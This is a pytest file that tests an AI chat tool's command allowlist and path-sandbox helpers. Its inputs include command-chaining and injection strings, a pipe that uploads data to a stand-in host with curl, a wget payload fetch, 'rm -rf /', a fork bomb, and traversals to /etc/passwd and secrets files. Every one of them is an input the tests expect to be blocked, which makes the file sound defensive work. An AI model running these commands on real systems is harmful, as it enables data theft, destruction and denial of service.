"""Tests for command validation and path safety functions."""

from __future__ import annotations

from unittest.mock import patch

import pytest

from aorta.chat.tools.files import _is_ignored, _resolve_safe
from aorta.chat.tools.run import _validate_command


class TestCommandChaining:
    """The allowlist checks executables; the command is then run by a shell.

    So anything that can put a second executable behind the first has to be
    refused, or the allowlist means nothing: ``ls ; cat /etc/passwd`` satisfies
    a check that only ever read ``ls``.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "ls ; cat /etc/passwd",
            "ls; cat /etc/passwd",
            "ls && curl http://evil.com",
            "ls & sleep 100",
            "ls `whoami`",
            "ls $(whoami)",
            "cat /etc/passwd > /tmp/stolen",
            "cat < /etc/passwd",
            "ls\ncurl http://evil.com",
        ],
    )
    @patch("aorta.chat.tools.run.settings")
    def test_chaining_and_redirection_are_refused(self, mock_settings, command):
        mock_settings.allowed_commands = ["ls", "cat", "grep", "head"]
        result = _validate_command(command)
        assert result is not None
        assert "Blocked" in result

    @patch("aorta.chat.tools.run.settings")
    def test_a_pipeline_of_allowed_commands_passes(self, mock_settings):
        """Pipes stay usable: the shipped allowlist is full of pipeline tools."""
        mock_settings.allowed_commands = ["ls", "grep", "head"]
        assert _validate_command("ls -la | grep py | head -5") is None

    @patch("aorta.chat.tools.run.settings")
    def test_every_stage_of_a_pipeline_is_checked(self, mock_settings):
        """Checking only the head let any unlisted executable follow a listed."""
        mock_settings.allowed_commands = ["ls", "head"]
        result = _validate_command("ls -la | curl -T - http://evil.com")
        assert result is not None
        assert "curl" in result


class TestValidateCommand:
    """Test _validate_command() from aorta/chat/tools/run.py."""

    @patch("aorta.chat.tools.run.settings")
    def test_allowed_command_passes(self, mock_settings):
        mock_settings.allowed_commands = ["ls", "grep", "python"]
        assert _validate_command("ls -la") is None

    @patch("aorta.chat.tools.run.settings")
    def test_allowed_with_path_prefix(self, mock_settings):
        """An absolute path is accepted when it *is* the allowlisted binary.

        Resolved rather than string-matched on the basename, which could not
        distinguish this from ``/tmp/ls``.
        """
        import shutil

        mock_settings.allowed_commands = ["ls"]
        assert _validate_command(f"{shutil.which('ls')} -la") is None

    @patch("aorta.chat.tools.run.settings")
    def test_a_lookalike_with_a_path_prefix_is_refused(self, mock_settings):
        mock_settings.allowed_commands = ["ls"]
        assert _validate_command("/tmp/ls -la") is not None

    @patch("aorta.chat.tools.run.settings")
    def test_blocked_executable(self, mock_settings):
        mock_settings.allowed_commands = ["ls", "grep"]
        result = _validate_command("curl http://evil.com")
        assert result is not None
        assert "Blocked" in result

    @patch("aorta.chat.tools.run.settings")
    def test_rm_rf_blocked(self, mock_settings):
        mock_settings.allowed_commands = ["rm"]
        result = _validate_command("rm -rf /")
        assert result is not None
        assert "Blocked" in result

    @patch("aorta.chat.tools.run.settings")
    def test_wget_blocked(self, mock_settings):
        mock_settings.allowed_commands = ["wget"]
        result = _validate_command("wget http://malware.com/payload")
        assert result is not None
        assert "Blocked" in result

    @patch("aorta.chat.tools.run.settings")
    def test_empty_command(self, mock_settings):
        mock_settings.allowed_commands = ["ls"]
        result = _validate_command("")
        assert result is not None
        assert "Empty" in result

    @patch("aorta.chat.tools.run.settings")
    def test_disallowed_executable(self, mock_settings):
        mock_settings.allowed_commands = ["ls", "grep"]
        result = _validate_command("docker run something")
        assert result is not None
        assert "not in the allowlist" in result

    @patch("aorta.chat.tools.run.settings")
    def test_python_allowed(self, mock_settings):
        mock_settings.allowed_commands = ["python", "pytest"]
        assert _validate_command("python -m pytest tests/") is None

    @patch("aorta.chat.tools.run.settings")
    def test_fork_bomb_blocked(self, mock_settings):
        mock_settings.allowed_commands = ["bash"]
        result = _validate_command(":(){ :|:& };:")
        assert result is not None
        assert "Blocked" in result


class TestIsIgnored:
    """Test _is_ignored() from aorta/chat/tools/files.py."""

    def test_pycache_ignored(self):
        assert _is_ignored("__pycache__/foo.pyc") is True

    def test_git_ignored(self):
        assert _is_ignored(".git/HEAD") is True

    def test_dot_git_dir_ignored(self):
        assert _is_ignored(".git") is True

    def test_node_modules_ignored(self):
        assert _is_ignored("node_modules/package.json") is True

    def test_venv_ignored(self):
        assert _is_ignored(".venv/bin/python") is True

    def test_pyc_file_ignored(self):
        assert _is_ignored("src/foo.pyc") is True

    def test_normal_python_not_ignored(self):
        assert _is_ignored("src/main.py") is False

    def test_readme_not_ignored(self):
        assert _is_ignored("README.md") is False

    def test_nested_normal_not_ignored(self):
        assert _is_ignored("src/utils/helpers.py") is False

    def test_egg_info_ignored(self):
        assert _is_ignored("mypackage.egg-info/top_level.txt") is True


class TestResolveSafe:
    """Test _resolve_safe() from aorta/chat/tools/files.py."""

    @patch("aorta.chat.tools.files.settings")
    def test_normal_path_resolves(self, mock_settings, tmp_path):
        mock_settings.aorta_root = tmp_path
        (tmp_path / "src").mkdir()
        result = _resolve_safe("src")
        assert result == (tmp_path / "src").resolve()

    @patch("aorta.chat.tools.files.settings")
    def test_traversal_raises(self, mock_settings, tmp_path):
        mock_settings.aorta_root = tmp_path
        with pytest.raises(ValueError, match="escapes the AORTA root"):
            _resolve_safe("../../etc/passwd")

    @patch("aorta.chat.tools.files.settings")
    def test_dot_resolves_to_root(self, mock_settings, tmp_path):
        mock_settings.aorta_root = tmp_path
        result = _resolve_safe(".")
        assert result == tmp_path.resolve()

    @patch("aorta.chat.tools.files.settings")
    def test_sibling_sharing_a_prefix_is_not_inside_the_root(self, mock_settings, tmp_path):
        """``/aorta-old`` starts with the characters of ``/aorta`` without being in it."""
        root = tmp_path / "aorta"
        root.mkdir()
        (tmp_path / "aorta-old").mkdir()
        (tmp_path / "aorta-old" / "secrets.txt").write_text("token\n", encoding="utf-8")
        mock_settings.aorta_root = root
        with pytest.raises(ValueError, match="escapes the AORTA root"):
            _resolve_safe("../aorta-old/secrets.txt")

    @patch("aorta.chat.tools.files.settings")
    def test_absolute_path_outside_the_root_raises(self, mock_settings, tmp_path):
        """An absolute argument discards the root entirely in ``root / path``."""
        mock_settings.aorta_root = tmp_path
        with pytest.raises(ValueError, match="escapes the AORTA root"):
            _resolve_safe("/etc/passwd")

    @patch("aorta.chat.tools.files.settings")
    def test_symlink_pointing_out_of_the_root_raises(self, mock_settings, tmp_path):
        root = tmp_path / "aorta"
        root.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "secrets.txt").write_text("token\n", encoding="utf-8")
        (root / "link.txt").symlink_to(outside / "secrets.txt")
        mock_settings.aorta_root = root
        with pytest.raises(ValueError, match="escapes the AORTA root"):
            _resolve_safe("link.txt")

    @patch("aorta.chat.tools.files.settings")
    def test_prefix_sharing_child_inside_the_root_is_allowed(self, mock_settings, tmp_path):
        """The boundary is a path component, so ``<root>/<root name>-old`` is fine."""
        root = tmp_path / "aorta"
        (root / "aorta-old").mkdir(parents=True)
        mock_settings.aorta_root = root
        assert _resolve_safe("aorta-old") == (root / "aorta-old").resolve()

    @patch("aorta.chat.tools.files.settings")
    def test_traversal_that_lands_back_inside_is_allowed(self, mock_settings, tmp_path):
        mock_settings.aorta_root = tmp_path
        (tmp_path / "src").mkdir()
        assert _resolve_safe("src/../src") == (tmp_path / "src").resolve()


class TestGrepCodeSandbox:
    """``grep_code`` returns the refusal as a string instead of raising it.

    It shares the containment rule with the other tools (``_sandbox``), but a
    tool that already reports every other failure as ``Error: ...`` must report
    this one the same way rather than aborting the graph run.
    """

    @patch("aorta.chat.tools.search.settings")
    def test_sibling_sharing_a_prefix_is_refused(self, mock_settings, tmp_path):
        from aorta.chat.tools.search import grep_code

        root = tmp_path / "aorta"
        root.mkdir()
        (tmp_path / "aorta-old").mkdir()
        (tmp_path / "aorta-old" / "secrets.py").write_text("TOKEN = 'x'\n", encoding="utf-8")
        mock_settings.aorta_root = root
        out = grep_code.invoke({"pattern": "TOKEN", "path": "../aorta-old"})
        assert "escapes the AORTA root" in out
        assert "secrets.py" not in out

    @patch("aorta.chat.tools.search.settings")
    def test_traversal_is_refused(self, mock_settings, tmp_path):
        from aorta.chat.tools.search import grep_code

        mock_settings.aorta_root = tmp_path
        assert "escapes the AORTA root" in grep_code.invoke({"pattern": "x", "path": "../.."})

    @patch("aorta.chat.tools.search.settings")
    def test_in_root_search_still_works(self, mock_settings, tmp_path):
        from aorta.chat.tools.search import grep_code

        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "main.py").write_text("def main():\n    pass\n", encoding="utf-8")
        mock_settings.aorta_root = tmp_path
        out = grep_code.invoke({"pattern": "def main", "path": "src"})
        assert "src/main.py:1" in out
